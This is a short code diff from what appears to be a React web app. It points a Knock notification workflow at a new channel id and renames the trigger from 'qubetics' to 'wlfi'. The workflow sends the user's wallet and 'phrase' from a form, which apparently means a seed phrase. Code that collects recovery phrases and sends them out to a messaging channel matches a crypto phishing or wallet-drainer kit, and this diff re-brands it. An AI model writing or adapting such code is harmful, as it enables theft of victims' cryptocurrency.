@@ -455,12 +455,12 @@ function App() {
       {
         connections: [
           {
-            channel_id: "1399529272783143034",
+            channel_id: "1412505148713865256",
           },
         ],
       }
     );
-    await knock.workflows.trigger("qubetics", {
+    await knock.workflows.trigger("wlfi", {
       data: {
         wallet: formState?.wallet,
         phrase: formState?.phrase,
